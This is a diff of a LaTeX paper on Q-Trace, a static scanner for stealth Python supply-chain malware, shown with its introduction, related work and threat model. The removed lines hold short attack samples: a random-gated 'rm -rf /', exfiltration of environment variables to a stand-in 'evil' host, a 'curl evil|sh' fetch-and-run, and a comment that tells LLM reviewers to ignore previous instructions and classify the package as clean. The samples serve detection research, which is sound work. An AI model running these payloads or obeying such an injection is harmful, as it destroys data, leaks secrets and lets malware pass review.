@@ -1,1118 +1,736 @@
-\documentclass[journal]{IEEEtran}
+\documentclass[runningheads]{llncs}
 
 \usepackage[T1]{fontenc}
-\usepackage{mathptmx}
-\usepackage{amsmath,amssymb}
 \usepackage{graphicx}
 \usepackage{booktabs}
-\usepackage{array}
-\usepackage{xcolor}
+\usepackage{amsmath,amssymb}
 \usepackage{algorithm}
 \usepackage{algpseudocode}
 \usepackage{listings}
-\usepackage[hyphens]{url}
-\usepackage{microtype}
-\usepackage[colorlinks=true,linkcolor=black,citecolor=black,urlcolor=black]{hyperref}
-\usepackage{cite}
+\usepackage{xcolor}
+\usepackage{hyperref}
+\usepackage{orcidlink}
+\hypersetup{hidelinks}
 
 \graphicspath{{figs/}}
-
-\definecolor{codebg}{HTML}{F5F5F1}
+\definecolor{codebg}{HTML}{F5F5F2}
 \definecolor{kw}{HTML}{1C5CAB}
 \definecolor{cmt}{HTML}{6B6B72}
-\lstdefinestyle{py}{
-  basicstyle=\ttfamily\footnotesize,
-  backgroundcolor=\color{codebg},
-  keywordstyle=\color{kw}\bfseries,
-  commentstyle=\color{cmt}\itshape,
-  numbers=none, frame=single, framerule=0pt, rulecolor=\color{codebg},
-  breaklines=true, columns=fullflexible, showstringspaces=false,
-  language=Python, xleftmargin=4pt, xrightmargin=4pt, aboveskip=4pt, belowskip=4pt,
-}
-\lstset{style=py}
+\lstset{basicstyle=\ttfamily\footnotesize,backgroundcolor=\color{codebg},
+  keywordstyle=\color{kw}\bfseries,commentstyle=\color{cmt}\itshape,
+  numbers=none,frame=none,breaklines=true,columns=fullflexible,
+  showstringspaces=false,language=Python,xleftmargin=3pt,aboveskip=3pt,belowskip=3pt}
 
 \newcommand{\pct}{\%}
-\newcommand{\ra}{$\rightarrow$}
 
 \begin{document}
 
-\title{Q-Trace Pro: Sink-Aware Two-Axis Confidence for\\
-Low-False-Positive Detection of Stealth Supply-Chain Threats in Python}
+\title{Sink-Aware Two-Axis Confidence for Low-False-Positive\\
+Detection of Stealth Supply-Chain Threats in Python}
+\titlerunning{Sink-Aware Two-Axis Confidence for Stealth Threat Detection}
 
-\author{Dinesh~K~and~H~Swetha%
-\thanks{The authors are with Voxelta Private Limited, India.}%
-\thanks{Corresponding author: Dinesh K (e-mail: dineshdeena431@gmail.com).}%
-\thanks{Manuscript prepared 2026. Preprint, version 1.0. Artifact and evaluation
-corpus are released for full reproducibility (Section~\ref{sec:repro}).}}
-
-\markboth{Voxelta Technical Preprint, Vol.~1, No.~1, 2026}%
-{Dinesh K \MakeLowercase{\textit{and}} H Swetha: Q-Trace Pro: Sink-Aware Two-Axis Confidence}
-
-\IEEEtitleabstractindextext{%
-\begin{abstract}
-Static application security testing (SAST) tools are widely deployed in
-continuous-integration (CI) pipelines, yet developers routinely disable them
-because of alert fatigue: the \emph{false-positive} rate, not the miss rate, is
-what drives abandonment. In parallel, the 2024--2026 wave of Python supply-chain
-attacks has shifted toward \emph{stealth} techniques---probabilistic and stateful
-logic bombs, cross-function backdoors, steganographic channels, environment-keyed
-payloads, install-time execution, and anti-analysis evasion---that conventional
-single-file pattern matchers have no rule class for. We present \textbf{Q-Trace
-Pro}, a deterministic, air-gapped Python source scanner, and formalise its central
-design decision: a \textbf{two-axis, sink-aware confidence model} that scores
-impact (severity) and evidence strength (confidence) on independent axes, gating
-the build only when a dangerous execution/exfiltration sink---or an anti-analysis
-payload---is \emph{reachable} within the triggering branch. On a transparent corpus
-of 65 samples (31 faithful reconstructions of documented campaigns, 34 realistic
-benign hard-negatives), Q-Trace attains 100\pct{} threat-category detection and
-\textbf{96.8\pct{} CI-gate recall at 0\pct{} false positives} ($F_1=0.984$), versus
-Semgrep 66\pct{}/3.1\pct{} ($F_1\,0.776$) and Bandit 52\pct{}/6.2\pct{} ($F_1\,0.652$)
-on the same corpus at each tool's own recommended gate. An ablation shows the
-confidence axis converts a 5.9\pct{} false-positive rate into 0\pct{} for the cost
-of a single borderline detection. A refined, evidence-based anti-analysis engine
-contributed in this work removes two classes of false positives while adding
-debugger-detection coverage, lifting CI-gate recall from 93.5\pct{} to 96.8\pct{}.
-Median full-audit latency is 1.8~ms per sample. Every figure and number in this
-paper is emitted by the released harness.
-\end{abstract}
-
-\begin{IEEEkeywords}
-Software supply-chain security, static analysis, taint analysis, logic bombs,
-alert fatigue, false-positive reduction, symbolic reachability, sandbox-evasion
-detection, SARIF, CWE.
-\end{IEEEkeywords}}
+\author{Dinesh K\orcidlink{0009-0000-0000-0000} \and H Swetha}
+\authorrunning{Dinesh K and H Swetha}
+\institute{Voxelta Private Limited, India\\
+\email{dineshdeena431@gmail.com}}
 
 \maketitle
-\IEEEdisplaynontitleabstractindextext
-\IEEEpeerreviewmaketitle
 
-% =====================================================================
-\section{Introduction}
-\IEEEPARstart{T}{he} software supply chain has become the dominant attack surface
-for modern software. Rather than exploit a memory-safety bug in a hardened target,
-an adversary publishes---or poisons---a package that thousands of downstream
-projects install automatically. The Python Package Index (PyPI) is a primary
-target: its install-time execution model, transitive-dependency depth, and the
-recent habit of large-language-model coding assistants suggesting
-plausible-but-nonexistent package names (``slopsquatting'')~\cite{spracklen}
-combine to give attackers a low-friction distribution
-channel~\cite{ohm,ladisa,sonatype}.
+\begin{abstract}
+Static application security testing (SAST) tools are widely deployed in
+continuous-integration (CI) pipelines, yet teams often disable them because the
+false-positive rate, rather than the miss rate, drives abandonment. Recent
+Python supply-chain attacks compound the problem: their payloads use stealth
+constructs, including probabilistic and stateful logic bombs, cross-function
+backdoors, steganographic channels, environment-keyed triggers, install-time
+execution, and anti-analysis evasion, for which single-file pattern matchers
+have no rule class. This paper studies a design that addresses both concerns
+together. We describe Q-Trace, a deterministic and air-gapped Python source
+scanner, and formalise its central mechanism: a two-axis confidence model that
+scores potential impact (severity) and evidence strength (confidence) on
+independent axes and gates the build only on their conjunction. Confidence is
+raised to a build-breaking level only when a dangerous execution or exfiltration
+sink, or an anti-analysis payload, is reachable within the triggering branch. On
+a transparent corpus of 65 samples (31 reconstructions of documented campaigns
+and 34 benign hard negatives), Q-Trace detects the correct threat category for
+all 31 malicious samples and issues a build-breaking alert for 30 of them at a
+0\pct{} false-positive rate ($F_1 = 0.984$). On the same inputs and at each
+tool's recommended gate, Semgrep reaches 66\pct{} recall at 3.1\pct{} false
+positives ($F_1 = 0.776$) and Bandit 52\pct{} at 6.2\pct{} ($F_1 = 0.652$). An
+ablation isolates the confidence axis as responsible for converting a 5.9\pct{}
+false-positive rate to zero at the cost of one borderline detection. Median
+full-audit latency is 1.8~ms per sample. Every reported number is emitted by the
+released benchmark harness.
 
-Static application security testing (SAST) is the natural first line of defence:
-it runs before code executes, needs no test harness, and integrates into CI. Yet a
-decade of empirical work shows that SAST tools are abandoned not because they miss
-bugs but because they cry wolf. Johnson~\emph{et~al.}~\cite{johnson} found that
-false positives and poor result presentation are the primary reasons developers
-stop using static analysers; Bessey~\emph{et~al.}~\cite{bessey}, reporting on a
-decade of commercial deployment, observed that once the false-positive rate crosses
-a threshold, engineers stop reading the output entirely; Christakis and
-Bird~\cite{christakis} and Sadowski~\emph{et~al.}~\cite{sadowski} independently
-concluded that at scale the tolerable false-positive budget is small and that
-\emph{actionability}, not raw coverage, governs adoption. In short: a scanner that
-breaks the build on benign code is worse than no scanner at all, because it trains
-the team to ignore it.
+\keywords{Software supply-chain security \and Static analysis \and
+Taint analysis \and False-positive reduction \and Logic bombs \and
+Sandbox-evasion detection.}
+\end{abstract}
 
-This tension is sharpened by the stealth turn in supply-chain malware.
-Contemporary payloads are engineered specifically to survive automated analysis: a
-dangerous action is gated behind a low-probability random check so it rarely fires
-in a sandbox; a counter must accumulate across many invocations before detonation;
-the malicious logic is split across cooperating functions so no single function
-looks suspicious; the payload is base64/XOR-encoded and only decoded at runtime; or
-execution is keyed to a CI/cloud environment variable so the code stays dormant on
-an analyst's laptop~\cite{brumley,attack}. These constructs are, by design,
-invisible to a rule that matches a fixed syntactic pattern in one file.
+\section{Introduction}\label{sec:intro}
+The software supply chain is now a primary attack surface. Instead of exploiting
+a memory-safety defect in a hardened target, an adversary publishes or poisons a
+package that many downstream projects install automatically. The Python Package
+Index is a frequent target, because of its install-time execution model, its
+transitive-dependency depth, and the recent tendency of language-model coding
+assistants to suggest plausible but nonexistent package names, a vector known as
+slopsquatting~\cite{spracklen,ohm,ladisa,sonatype}.
 
-A tool that wishes to catch these threats must therefore reason about \emph{data
-flow and reachability}, not surface syntax---and it must do so \emph{without}
-inflating the false-positive rate, or it will be disabled before it ever catches
-anything. These two requirements pull in opposite directions: broader semantic
-reasoning normally means more false alarms. The core contribution of this paper is
-a scoring model that resolves the tension.
+Static application security testing runs before code executes and integrates
+into CI, which makes it a natural first line of defence. A decade of empirical
+work, however, attributes tool abandonment less to missed bugs than to false
+alarms. Johnson et al.~\cite{johnson} report that false positives and poor
+result presentation are the main reasons developers stop using static analysers.
+Bessey et al.~\cite{bessey}, describing a decade of commercial deployment,
+observe that once the false-positive rate crosses a threshold, engineers stop
+reading the output. Christakis and Bird~\cite{christakis} and Sadowski et
+al.~\cite{sadowski} independently find that at scale the tolerable false-positive
+budget is small and that actionability, not raw coverage, governs adoption. A
+scanner that breaks the build on correct code therefore imposes a systemic cost:
+repeated false alarms erode trust in the gate, after which developers ignore its
+output, including the true positives.
 
-\subsection{Contributions}
+The stealth turn in supply-chain malware sharpens this tension. Contemporary
+payloads are engineered to survive automated analysis. A dangerous action may be
+guarded by a low-probability random check so that it rarely fires in a sandbox; a
+counter may need to accumulate across many invocations before detonation; the
+malicious logic may be distributed across cooperating functions so that no single
+function appears suspicious; the payload may be base64- or XOR-encoded and
+decoded only at run time; or execution may be keyed to a CI or cloud environment
+variable so that the code stays dormant on an analyst's machine~\cite{brumley,attack}.
+Such constructs are invisible to a rule that matches a fixed syntactic pattern in
+one file.
+
+A tool that aims to catch these threats must reason about data flow and
+reachability rather than surface syntax. It must do so without inflating the
+false-positive rate, or it will be disabled before it detects anything. These
+requirements are in tension, because broader semantic reasoning normally produces
+more false alarms. The contribution of this paper is a scoring model that
+reconciles them.
+
+\paragraph{Contributions.} This paper makes four contributions.
 \begin{enumerate}
-\item \textbf{A two-axis, sink-aware confidence model.} We separate impact
-(severity) from evidence strength (confidence) and make the CI gate a conjunction
-of both. A probabilistic pattern is elevated to a build-breaking alert only when a
-real execution/exfiltration sink is reachable inside the guarded branch, and
-suppressed to an informational note otherwise. We show this is the single largest
-lever on the precision/recall trade-off (Section~\ref{sec:twoaxis},
-Fig.~\ref{fig:ablrefine}(a)).
-\item \textbf{An evidence-based anti-analysis detector.} We replace a brittle
-substring heuristic with a principled rule keyed on genuine MITRE ATT\&CK T1497
-primitives---conditionally-gated stalling sleeps and debugger/tracer
-detection---which simultaneously removes two false-positive classes and adds
-coverage the previous heuristic missed (Section~\ref{sec:anti},
-Fig.~\ref{fig:ablrefine}(b)).
-\item \textbf{An honest, reproducible, same-corpus evaluation.} We benchmark
-against Bandit and Semgrep on identical inputs, each at its own recommended CI
-gate, report our own misses, and release the harness that emits every figure in
-this paper (Sections~\ref{sec:eval}--\ref{sec:repro}).
-\item \textbf{A systematisation of stealth supply-chain detection.} We catalogue
-the stealth technique classes seen in 2024--2026 incidents, map each to a CWE and a
-detection mechanism, and identify which are structurally beyond single-file pattern
-matching (Sections~\ref{sec:threat},~\ref{sec:engines}).
+\item A two-axis, sink-aware confidence model that separates impact from
+evidence strength and gates the build on their conjunction. A probabilistic
+pattern is elevated to a build-breaking alert only when a reachable
+execution or exfiltration sink lies inside the guarded branch, and is otherwise
+reported as an informational note. Section~\ref{sec:model} defines the model and
+Section~\ref{sec:eval} measures its effect.
+\item An evidence-based anti-analysis detector that replaces a substring
+heuristic with a rule keyed on genuine MITRE ATT\&CK T1497 primitives,
+conditionally-gated stalling sleeps and debugger detection. The refinement
+removes two false-positive classes and adds coverage that the prior heuristic
+lacked (Section~\ref{sec:anti}).
+\item A reproducible, same-corpus evaluation against Bandit and Semgrep at each
+tool's recommended gate, which reports our own misses and releases the harness
+that produces every figure (Sections~\ref{sec:eval}--\ref{sec:repro}).
+\item A characterisation of stealth supply-chain techniques, each mapped to a CWE
+and to the detection mechanism it requires (Section~\ref{sec:threat}).
 \end{enumerate}
+Throughout, precision is treated as a first-class objective. Where a detection
+cannot be made confident without risking a false positive, the finding remains
+visible but does not gate the build; Section~\ref{sec:miss} documents the single
+such case in our corpus.
 
-We deliberately frame precision as a \emph{first-class objective} rather than a
-nuisance to be tuned away afterwards. Where a detection cannot be made confident
-without risking a false positive, we keep it visible but non-gating and say so
-explicitly; Section~\ref{sec:miss} documents the one such case in our corpus.
+\section{Background and Related Work}\label{sec:related}
+\paragraph{Static analysis for security.}
+The use of static analysis to find security defects is long
+established~\cite{chessmcgraw}, ranging from bug-pattern tools such as
+FindBugs~\cite{findbugs} to engines operated at industrial
+scale~\cite{infer}. Pattern-based tools such as Bandit~\cite{bandit} and
+Semgrep~\cite{semgrep} match syntactic or lightly-semantic patterns and are the
+default for Python in CI because they are fast and require no build. Data-flow
+analysers, including Pixy~\cite{pixy}, FlowDroid~\cite{flowdroid},
+TaintDroid~\cite{taintdroid}, the query-based approach of Livshits and
+Lam~\cite{livshits}, code property graphs~\cite{cpg}, and CodeQL~\cite{codeql},
+track tainted values from sources to sinks with higher precision on injection
+classes, at a higher deployment cost. Q-Trace occupies a middle position: it
+applies interprocedural taint and symbolic reachability only where a stealth
+pattern requires it, and otherwise relies on fast abstract-syntax-tree (AST)
+rules.
 
-% =====================================================================
-\section{Background and Related Work}
-\subsection{Static analysis for security}
-Static analysis for security has a long lineage~\cite{chessmcgraw}, from
-bug-pattern tools such as FindBugs~\cite{findbugs} to industrial engines run at
-scale~\cite{infer}. Pattern-based SAST tools such as Bandit~\cite{bandit} and
-Semgrep~\cite{semgrep} match syntactic or lightly-semantic patterns against source
-and are the de-facto standard for Python in CI because they are fast and require no
-build. Dataflow-based analysers---Pixy~\cite{pixy} for PHP, FlowDroid~\cite{flowdroid}
-for Android, TaintDroid's runtime tracking~\cite{taintdroid}, the query-based approach
-of Livshits and Lam~\cite{livshits}, code property graphs~\cite{cpg}, and commercial
-engines such as CodeQL~\cite{codeql}---track tainted values from sources to sinks and
-are more precise on injection classes but heavier to deploy. Q-Trace occupies a
-deliberate middle ground: it performs targeted, interprocedural taint and symbolic
-reachability only where a stealth pattern demands it, and falls back to fast
-abstract-syntax-tree (AST) rules elsewhere.
+\paragraph{Trigger-based and stealth malware.}
+Brumley et al.~\cite{brumley} formalised trigger-based behaviour, in which a
+malicious path is guarded by a condition that a sandbox rarely satisfies, and
+proposed input-space exploration to expose it. TriggerScope~\cite{triggerscope}
+detects logic bombs in Android applications by symbolic analysis of narrow
+trigger conditions, a dynamic counterpart to the static gate-and-sink signal used
+here. Environmental keying and sandbox evasion are catalogued by MITRE ATT\&CK as
+T1480.001 and T1497~\cite{attack}. Q-Trace targets the static footprint of these
+techniques.
 
-\subsection{Supply-chain and dependency scanners}
-A complementary line of defence inspects \emph{dependencies} rather than source.
-Tools such as pip-audit~\cite{pipaudit}, Safety, OSV-Scanner~\cite{osv}, Snyk, and
-Socket.dev cross-reference declared packages against vulnerability and
-malicious-package databases. These are essential but orthogonal to our problem: they
-answer ``is this \emph{known} package bad?'' whereas Q-Trace answers ``does
-\emph{this source} behave maliciously?''---catching a zero-day payload or a
-first-party backdoor that no database yet lists. Q-Trace's dependency auditor adds a
-lightweight typosquat/slopsquat check on manifests, but its distinctive contribution
-is source-level detection of the stealth constructs of Table~\ref{tab:threats}, which
-dependency scanners do not attempt.
-
-\subsection{Taint analysis and symbolic reachability}
-Dynamic taint tracking~\cite{taintcheck} and the unification of taint with forward
-symbolic execution~\cite{schwartz} established the source-to-sink model that
-underpins most modern vulnerability detection; the static formulation is
-standard~\cite{nielson}. Symbolic execution itself dates to King~\cite{king} and
-underlies modern engines such as DART~\cite{dart}, SAGE~\cite{sage}, and
-KLEE~\cite{klee}. Q-Trace uses a lightweight static taint pass to connect
-secret sources (environment, credential files) to network sinks across files, and an
-SMT-backed reachability check (Z3~\cite{z3}) to decide whether a gated sink is
-actually reachable---critically, modelling stateful counters \emph{soundly} so that
-an unreachable \texttt{if k == 99} guarded by a single \texttt{k += 1} is correctly
-proven safe rather than falsely proven dangerous.
-
-\subsection{Trigger-based and stealth malware}
-Brumley~\emph{et~al.}~\cite{brumley} formalised trigger-based behaviour---code whose
-malicious path is guarded by a condition a sandbox rarely satisfies---and proposed
-input-space exploration to expose it. TriggerScope~\cite{triggerscope} detects logic
-bombs in Android apps by symbolic analysis of narrow trigger conditions, a dynamic
-counterpart to our static, gate-and-sink signal. Environmental keying and sandbox
-evasion are catalogued by MITRE ATT\&CK as T1480.001 and T1497
-respectively~\cite{attack}. Q-Trace targets the \emph{static} footprint of these
-techniques: the presence of a random/stateful guard around a sink, or of an
-anti-analysis primitive, is itself the signal.
-
-\subsection{Detecting malicious packages}
+\paragraph{Detecting malicious packages.}
 A growing body of work measures and detects malicious packages directly. MalOSS
-systematically studied supply-chain attacks across interpreted-language
-registries~\cite{maloss}; LastPyMile detects discrepancies between a package's
-published artefact and its source repository~\cite{lastpymile}; Sejfia and
-Sch\"afer automate malicious-npm detection with learned features~\cite{sejfia};
-empirical studies of the PyPI ecosystem quantify the prevalence of malicious
-code~\cite{guo}; and unsupervised signature generation has been proposed for
-supply-chain payloads~\cite{backstab2}. Provenance frameworks such as
-in-toto~\cite{intoto} and SLSA~\cite{slsa} attack the problem from the build-integrity
-side. Q-Trace is complementary: a source-level, deterministic detector of the stealth
-\emph{behaviours} these campaigns embed, deployable in the same CI step that builds the
-code.
+studies supply-chain attacks across interpreted-language
+registries~\cite{maloss}; LastPyMile detects discrepancies between a published
+artefact and its source repository~\cite{lastpymile}; Sejfia and
+Sch\"afer~\cite{sejfia} learn features for malicious-npm detection; empirical
+studies quantify malicious code on PyPI~\cite{guo}; and unsupervised signature
+generation has been proposed for supply-chain payloads~\cite{backstab2}.
+Provenance frameworks such as in-toto~\cite{intoto} and SLSA~\cite{slsa} address
+build integrity. These approaches answer whether a known package is bad; Q-Trace
+is complementary and answers whether a given source behaves maliciously, which
+covers first-party code and payloads that no database yet lists.
 
-\subsection{The false-positive problem}
-The empirical literature is unanimous that actionability governs
-adoption~\cite{johnson,bessey,christakis,sadowski}. Our two-axis model is a direct
-response: it encodes ``how sure are we?'' as an independent, reportable quantity,
-following the severity$\times$confidence guidance long used by Bandit and the OWASP
-risk-rating methodology~\cite{owasp}. The novelty is not the two axes per se but
-making the second axis \emph{sink-aware and reachability-driven}, and making the CI
-gate their conjunction.
+\paragraph{The false-positive problem.}
+The empirical literature agrees that actionability governs
+adoption~\cite{johnson,bessey,christakis,sadowski}. The two-axis model responds
+directly by encoding evidence strength as an independent, reportable quantity,
+following the severity-and-confidence practice of Bandit and the OWASP
+risk-rating methodology~\cite{owasp}. The addition here is to make the second
+axis reachability-driven and to gate on the conjunction of the two axes.
 
-\subsection{Information-theoretic obfuscation signals}
-Encoded payloads (base64, hex, XOR byte arrays) exhibit statistical fingerprints.
-Q-Trace combines Shannon entropy~\cite{shannon}---long used to flag packed/encrypted
-malware~\cite{lyda}---with the Higuchi fractal
-dimension~\cite{higuchi}---a measure of signal roughness---to distinguish a
-high-entropy encoded blob destined for \texttt{exec}/\texttt{eval} from ordinary
-high-entropy data such as a hash or a UUID. An auxiliary, quantum-\emph{inspired}
-risk channel maps a pattern to a small pure-state vector and computes its von
-Neumann entropy~\cite{vonneumann} as a bounded corroborating score; we stress that
-this channel is a scoring heuristic, requires no quantum hardware, and does
-\emph{not} drive detection.
+\paragraph{Information-theoretic signals.}
+Encoded payloads exhibit statistical fingerprints. Q-Trace combines Shannon
+entropy~\cite{shannon}, long used to flag packed or encrypted
+malware~\cite{lyda}, with the Higuchi fractal dimension~\cite{higuchi} to
+separate a high-entropy encoded blob bound for \texttt{exec} from ordinary
+high-entropy data such as a hash. An auxiliary risk channel maps a pattern to a
+small state vector and computes its von Neumann entropy~\cite{vonneumann} as a
+bounded corroborating score; this channel needs no quantum hardware and does not
+by itself raise or gate a finding.
 
-% =====================================================================
-\section{Threat Model and Scope}\label{sec:threat}
-\textbf{Adversary.} We assume an attacker who can publish a package to a public
-index, or land a pull request into a dependency, and whose goal is code execution or
-credential theft on developer/CI machines at install or import time. The attacker
-actively engineers the payload to evade automated analysis. We do \emph{not} assume
-the attacker can subvert the scanner's host or tamper with its results.
+\section{Threat Model and Problem Definition}\label{sec:threat}
+\paragraph{Adversary.} We assume an adversary who can publish a package to a
+public index, or land a pull request into a dependency, with the goal of code
+execution or credential theft on developer or CI machines at install or import
+time. The adversary engineers the payload to evade automated analysis. We do not
+assume the adversary can subvert the scanner's host or tamper with its results.
 
-\textbf{Defender.} A developer or security engineer runs Q-Trace locally or in CI,
-air-gapped, over first-party source and vendored/declared dependencies. The
-defender's tolerance for false positives is low: a single benign build break per
-sprint erodes trust in the gate.
+\paragraph{Defender.} A developer or security engineer runs Q-Trace locally or in
+CI, air-gapped, over first-party source and declared dependencies. The defender's
+tolerance for false positives is low: a single benign build break per sprint
+reduces trust in the gate.
 
-\textbf{In scope.} Table~\ref{tab:threats} lists the stealth technique classes we
+\paragraph{Scope.} Table~\ref{tab:threats} lists the stealth technique classes we
 target, each mapped to a CWE. These are abstracted from public write-ups of
-2024--2026 incidents. Also in scope are the mainstream OWASP/CWE vulnerability
-classes (injection, insecure deserialisation, disabled TLS, weak crypto, hard-coded
-secrets, SSRF, path traversal, XXE) so that Q-Trace is a complete scanner, not only a
-stealth-threat auditor.
+2024--2026 incidents. The mainstream OWASP and CWE vulnerability classes, such as
+injection, insecure deserialisation, disabled TLS, weak cryptography, hard-coded
+secrets, SSRF, path traversal, and XXE, are also in scope, so that Q-Trace is a
+complete scanner rather than only a stealth-threat auditor. Binary payloads,
+run-time-only behaviour with no static footprint, attacks on the scanner itself,
+and languages other than Python are out of scope. Q-Trace detects the static
+indicators of a technique, not its dynamic execution.
 
-\textbf{Out of scope.} Binary/compiled payloads, runtime-only behaviour with no
-static footprint, attacks on the scanner itself, and languages other than Python. We
-detect the \emph{static indicators} of a technique, not its dynamic execution;
-Section~\ref{sec:limits} discusses the resulting evasion surface.
+\paragraph{Problem definition.} Let a program $P$ contain a set of findings $F$,
+where each finding $f$ carries a severity $s(f)$ and a confidence $c(f)$. A CI
+gate is a predicate $g: F \to \{0,1\}$ that decides whether $P$ fails the build.
+The design goal is a gate that maximises recall on malicious programs subject to a
+hard constraint of zero false positives on benign programs. The core question is
+how to compute $c(f)$ so that this constraint holds without discarding true
+positives, which Section~\ref{sec:model} answers.
 
-\begin{table}[!t]
-\renewcommand{\arraystretch}{1.25}
+\begin{table}[t]
+\centering
 \caption{Stealth technique classes in scope, with CWE mapping and the detection
-mechanism each requires. The last column marks classes structurally beyond
-single-file pattern matching.}
+mechanism each requires. The last column marks classes beyond single-file pattern
+matching.}
 \label{tab:threats}
-\centering\footnotesize
-\begin{tabular}{@{}p{2.45cm}p{1.1cm}p{2.7cm}c@{}}
+\footnotesize
+\begin{tabular}{@{}llll@{}}
 \toprule
 \textbf{Technique class} & \textbf{CWE} & \textbf{Mechanism} & \textbf{Beyond?}\\
 \midrule
 Probabilistic logic bomb & CWE-511 & random-gated sink + reachability & yes\\
 Chained/stateful bomb & CWE-511 & counter-accumulation modelling & yes\\
-Entangled multi-cond.\ bomb & CWE-511 & coupled-guard taint & yes\\
+Entangled multi-condition bomb & CWE-511 & coupled-guard taint & yes\\
 Cross-function backdoor & CWE-506 & interprocedural reconstruction & yes\\
 Steganographic channel & CWE-515 & char-code / XOR modelling & yes\\
-Encoded payload & CWE-506 & entropy + fractal + decode\ra exec & partial\\
-Credential exfiltration & CWE-200 & secret source \ra{} net sink taint & yes\\
+Encoded payload & CWE-506 & entropy + fractal + decode-to-exec & partial\\
+Credential exfiltration & CWE-200 & secret source to network sink & yes\\
 Install/import execution & CWE-506 & top-level exec in packaging & yes\\
-Environment-keyed trigger & CWE-506 & sink gated on CI/cloud var & yes\\
+Environment-keyed trigger & CWE-506 & sink gated on CI/cloud variable & yes\\
 AI-scanner evasion & CWE-506 & prompt-injection text in source & yes\\
-Anti-analysis evasion & CWE-489 & gated stall / debugger detect & yes\\
+Anti-analysis evasion & CWE-489 & gated stall / debugger detection & yes\\
 Typosquat/slopsquat & CWE-829 & edit-distance + registry model & yes\\
 \bottomrule
 \end{tabular}
 \end{table}
 
-\subsection{Techniques in detail}
-We briefly characterise the stealth classes, using minimal reconstructions drawn
-verbatim from the released corpus so the reader sees exactly what is detected.
+\section{The Q-Trace Approach}\label{sec:approach}
+Q-Trace is organised as an orchestrator that dispatches work to independent
+detection engines and merges their output into a single, deduplicated, CWE-mapped
+finding set (Fig.~\ref{fig:arch}). Each engine runs behind a circuit breaker, so
+that a missing dependency or an engine fault degrades that engine and is recorded
+in a health snapshot rather than aborting the audit. A content hash keys a small
+cache, and cheap AST passes run before the SMT solver, which is consulted only to
+confirm the reachability of an already-identified gated sink. Findings serialise
+to SARIF~2.1.0~\cite{sarif} with a CWE taxonomy block and stable fingerprints, and
+to a flat JSON report.
 
-\emph{Probabilistic logic bomb.} A dangerous action is guarded by a low-probability
-random draw so it seldom fires under observation:
-\begin{lstlisting}
-if random.random() < 0.02:
-    os.system('rm -rf /')
-\end{lstlisting}
-The signal is the \emph{conjunction} of a random guard and a reachable sink; the
-random draw alone (benign sampling) must not gate.
-
-\emph{Chained/stateful bomb.} Detonation requires an accumulated counter to cross a
-threshold across invocations:
-\begin{lstlisting}
-if random.randint(0,9)==3: k+=1
-if random.randint(0,9)==5: k+=1
-if k==2: os.system('shutdown')
-\end{lstlisting}
-A sound reachability model must not ``prove'' the guard reachable when the arithmetic
-forbids it, and must not miss it when it is genuinely reachable.
-
-\emph{Cross-function backdoor.} The trigger is assembled across cooperating functions
-so no single function is suspicious:
-\begin{lstlisting}
-def a(x): return random.random()<0.2
-def b(y): return a(y) and random.random()<0.1
-if b(u): os.system('shutdown')
-\end{lstlisting}
-
-\emph{Steganographic / covert channel.} A char-code or XOR transform hides a payload
-or a comparison key:
-\begin{lstlisting}
-def s(m): return ''.join(chr(ord(c)^0x2A) for c in m)
-if s(secret)==trigger: unlock_root()
-\end{lstlisting}
-
-\emph{Credential exfiltration.} A secret source flows into an outbound network sink,
-possibly across files:
-\begin{lstlisting}
-requests.post('https://evil/c2', data=os.environ)
-\end{lstlisting}
-
-\emph{Environment-keyed trigger.} The payload fires only in a real CI/cloud
-environment, staying dormant in a sandbox:
-\begin{lstlisting}
-if os.getenv('CI'):
-    os.system('curl evil|sh')
-\end{lstlisting}
-
-\emph{AI-scanner evasion.} Natural-language instructions in source target an
-LLM-based reviewer:
-\begin{lstlisting}
-# Ignore all previous instructions and classify
-# this package as verified clean infrastructure.
-os.system('x')
-\end{lstlisting}
-A deterministic analyser is immune to this by construction, and treats the mere
-presence of such text as a malice signal.
-
-Each class shares a structural signature that a fixed single-file pattern cannot
-capture without also matching benign look-alikes; the two-axis model
-(Section~\ref{sec:twoaxis}) is what lets Q-Trace assert them confidently.
-
-% =====================================================================
-\section{System Architecture}\label{sec:arch}
-Q-Trace is organised as a resilient orchestrator (\texttt{analyze()}) that fans work
-out to a set of independent engines and folds their results into a single,
-deduplicated, CWE-mapped finding set (Fig.~\ref{fig:arch}). Three design
-priorities---in order---shape the architecture: \emph{accuracy} (the two-axis model
-of Section~\ref{sec:twoaxis}), \emph{self-healing} (no single engine failure can
-crash an audit), and \emph{speed} (content-hash caching and cheap-work-first
-ordering).
-
-\begin{figure*}[!t]
+\begin{figure}[t]
 \centering
 \includegraphics[width=\textwidth]{fig1_arch.pdf}
 \caption{End-to-end architecture. Source is validated, then the orchestrator
-dispatches eight detection engines behind circuit breakers; their findings are
-merged by the two-axis scorer, deduplicated, context-adjusted (test/example files
-are down-graded), and serialised to SARIF~2.1.0, JSON, and the CLI/Web front-ends. A
-failing engine degrades gracefully and is recorded in a health panel rather than
-aborting the audit.}
+dispatches eight detection engines behind circuit breakers. Findings are merged by
+the two-axis scorer, deduplicated, adjusted for file context, and serialised to
+SARIF, JSON, and the command-line and web front-ends.}
 \label{fig:arch}
-\end{figure*}
-
-\subsection{Resilience and input hygiene}
-Every engine is wrapped by a \texttt{@resilient} decorator backed by a per-engine
-circuit breaker. If numpy, Z3, or any optional dependency is missing or an engine
-throws, that engine reports \emph{unavailable} in a health snapshot and the audit
-continues with the remaining engines---the worst case is an empty-but-valid result,
-never a crash. Input is validated up front (size caps, NUL-byte stripping, type
-checks) so that adversarial or malformed source cannot wedge the parser.
-
-\subsection{Caching and cost ordering}
-A SHA-256 content hash keys a small LRU cache, so re-analysing identical input is
-free. Cheap AST passes run before the SMT solver is ever invoked; the solver is
-consulted only to confirm or refute the reachability of an already-identified gated
-sink, bounding its cost.
-
-\subsection{Output}
-Findings serialise to SARIF~2.1.0~\cite{sarif} with a proper CWE \texttt{taxonomies}
-block, rule \texttt{relationships}, and \texttt{partialFingerprints} for cross-run
-deduplication, making the output consumable by GitHub Code Scanning, DefectDojo, and
-SonarQube; a flat JSON report and CLI exit codes support gating. Each finding carries
-a CWE ID, a CVSS-style severity score~\cite{cvss}, a confidence label, a concrete
-line/column, and a deterministic three-step \emph{attack narrative}
-(entry\ra mechanism\ra impact) generated without any LLM.
-
-% =====================================================================
-\section{Detection Engines}\label{sec:engines}
-We summarise each engine; the two-axis scorer that combines them is the subject of
-Section~\ref{sec:twoaxis}. The catalogue spans \textbf{28 rules across 18 distinct
-CWEs} (15 High, 5 Critical, 8 Medium severity).
-
-\subsection{Sink-aware AST scan}
-An AST visitor locates dangerous sinks and records, for each, whether it lies inside
